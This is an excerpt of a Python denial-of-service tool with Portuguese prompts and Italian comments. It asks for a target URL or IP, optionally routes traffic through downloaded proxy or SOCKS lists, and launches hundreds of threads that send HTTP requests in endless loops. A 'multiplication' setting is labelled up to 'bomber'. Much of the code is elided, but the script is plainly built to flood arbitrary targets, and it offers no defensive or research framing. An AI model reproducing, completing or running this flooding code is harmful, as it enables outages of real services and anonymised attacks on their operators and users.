...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	choice1 = input("\033[94mDeseja atacar um alvo [0] ou mais [1] >\033[0m")
	...
	if choice1 == "1":
		...
		url = input("\033[94mInsira URL/IP: \033[0m").strip()

		if url == "":
			print ("\033[94mInsira o IP/URL.\033[0m")
			starturl()
		...
		try:
			...
			print("\033[94mVocê não digitou, tente novamente.\033[0m")
			starturl()
...
def proxymode():
	global choice2
	choice2 = input("\033[94mDeseja usar proxy/socks mode? Use 'y' se sim: \033[0m")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("\033[94mUse '0' para usar proxymode ou '1' para socksmode: \033[0m")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("Você não digitou, tente novamente.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("\033[94mVocê quer baixar uma lista proxy? Use 'y' se sim: \033[0m")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("\033[94mVocê quer baixar uma lista socks? Use 'y' para fazer isso: \033[0m ")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("\033[94mDigite o nome da proxylist (proxy.txt):\033[0m "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("\033[94mInsira o número de pacotes(800): \033[0m "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("\033[94mInsira o número de multiplicação dos pacotes [(1-5=normal)(50=poderoso)(100 ou mais=bomber)]: \033[0m"))
	except ValueError:
		print("Você não digitou, tente novamente.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("\033[94mUse 'Enter' para iniciar o ataque: \033[0m")
	if choice6 == "":
		loop()
	...
	if choice2 == "y": # se abbiamo scelto la modalita' proxying
		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
			for x in range(threads):
				...
				print ("\033[94mThread \033[0m" + str(x) + "\033[94m ready!\033[0m ")
			...
			for x in range(threads):
				...
				print ("\033[94m Thread \033[0m" + str(x) + " \033[94mready!\033[0m")
			go.set() # questo fa avviare i threads appena sono tutti pronti
	else: # altrimenti manda richieste normali non proxate.
		for x in range(threads):
			RequestDefaultHTTP(x+1).start() # starta la classe apposita
			print ("\033[94mThread \033[0m" + str(x) + " \033[94mready!\033[0m")
		go.set() # questo fa avviare i threads appena sono tutti pronti
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("\033[94mRequest sent from \033[0m" + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				print ("\033[94mRequest sent from \033[0m" + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
